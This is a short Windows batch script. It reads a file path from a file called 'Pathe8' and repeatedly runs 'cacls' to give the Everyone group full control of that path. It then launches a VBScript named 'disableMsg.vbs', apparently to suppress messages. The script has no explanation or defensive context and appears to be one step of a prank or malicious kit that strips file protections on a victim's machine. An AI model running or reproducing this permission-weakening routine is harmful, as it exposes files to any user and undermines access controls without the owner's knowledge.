@echo off
echo.
echo.
for /f "Delims=" %%a in (Pathe8) do (
set qwe=%%a
)
echo.
for /L %%N in (0 1 16) do ( 
cacls "%qwe%" /e /p everyone:f
)

start disableMsg.vbs
exit